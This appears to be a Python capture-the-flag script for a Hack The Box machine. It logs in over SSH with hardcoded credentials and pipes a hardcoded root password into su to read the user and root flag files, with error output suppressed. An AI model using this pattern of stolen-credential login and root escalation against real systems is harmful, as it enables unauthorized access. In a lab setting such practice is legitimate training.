import os
import sys
import warnings
import paramiko

# Redirigir stderr a /dev/null antes de importar paramiko
stderr = sys.stderr
sys.stderr = open(os.devnull, 'w')

# Suprimir TODAS las advertencias
warnings.simplefilter("ignore")
warnings.filterwarnings("ignore")

def show_intro():
    print("#" * 50)
    print("#   SSH Auto-Flag Grabber - Created by Moroko   #")
    print("#" * 50, "\n")

def establish_connection(target, user, passwd):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, username=user, password=passwd)
        return ssh
    except Exception as err:
        print("[!] Connection Failed:", err)
        return None

def fetch_content(ssh_client, cmd):
    try:
        stdin, stdout, stderr = ssh_client.exec_command(cmd)
        return stdout.read().decode().strip()
    except Exception as err:
        print("[!] Error executing command:", err)
        return ""

def process_flags(server, usr, usr_pwd, root_pwd):
    show_intro()
    connection = establish_connection(server, usr, usr_pwd)
    if not connection:
        return
    
    print("[*] Retrieving user-level flag...")
    user_flag = fetch_content(connection, "cat ~/user.txt")
    print("-> User Flag:", user_flag or "[Failed]")
    
    print("[*] Attempting root access...")
    root_flag = fetch_content(connection, f'echo {root_pwd} | su -c "cat /root/root.txt"')
    print("-> Root Flag:", root_flag or "[Failed]")
    
    connection.close()
    print("[*] Session Terminated.")

if __name__ == "__main__":
    SERVER_IP = "cat.htb"
    LOGIN_USER = "axel"
    LOGIN_PASS = "aNdZwgC4tI9gnVXv_e3Q"
    ROOT_PASS = "IKw75eR0MR7CMIxhH0"
    
    # Ejecutar el script principal
    process_flags(SERVER_IP, LOGIN_USER, LOGIN_PASS, ROOT_PASS)

    # Restaurar stderr
    sys.stderr = stderr
